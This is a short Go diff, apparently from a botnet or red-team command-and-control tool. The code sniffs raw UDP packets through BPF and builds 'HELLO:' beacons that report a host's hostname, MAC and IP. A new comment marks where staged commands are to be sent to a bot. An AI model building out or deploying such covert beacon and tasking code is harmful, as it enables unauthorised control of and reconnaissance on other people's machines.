@@ -68,7 +68,7 @@ func ReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Add logic to make sure this is my own shit
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO") {
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "HELLO:") {
 			return packet
 		}
 		return nil
@@ -92,6 +92,8 @@ func ProcessPacket(packet gopacket.Packet) {
 	ip := net.IP(payload[4])
 
 	fmt.Println(typeOfMessage, id, hostname, mac, ip)
+
+	// Take staged command and craft packet to send to bot
 
 	fmt.Println()
 
@@ -348,7 +350,7 @@ func CreateHello(hostMAC net.HardwareAddr, srcIP net.IP, count int) (hello strin
 		log.Fatal("Hostname not found...")
 	}
 
-	hello = "HELLO " + strconv.Itoa(count) + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
+	hello = "HELLO: " + strconv.Itoa(count) + " " + hostname + " " + hostMAC.String() + " " + srcIP.String()
 
 	return hello
 }
